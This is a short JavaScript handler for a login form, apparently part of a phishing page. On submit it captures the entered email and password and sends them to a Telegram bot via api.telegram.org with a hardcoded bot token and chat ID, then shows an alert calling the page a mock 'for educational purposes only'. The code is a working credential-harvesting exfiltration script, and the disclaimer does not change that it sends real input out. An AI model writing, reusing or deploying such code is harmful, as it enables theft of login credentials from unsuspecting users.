document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  // Debugging: Log the captured values to the console
  console.log('Email:', email);
  console.log('Password:', password);
  
  const data = {
    email: email,
    password: password
  };
  
  const telegramBotToken = '7649745411:AAF-9B12PkSUV8YIO_R-3TXcouEKtLAPmE8'; // Your Telegram bot token
  const chatId = '7742630008'; // Your chat ID
  
  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `Email: ${email}\nPassword: ${password}`
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      alert('Form submitted! This is a mock login page for educational purposes only.');
    })
    .catch(error => {
      console.error('Error:', error);
    });
});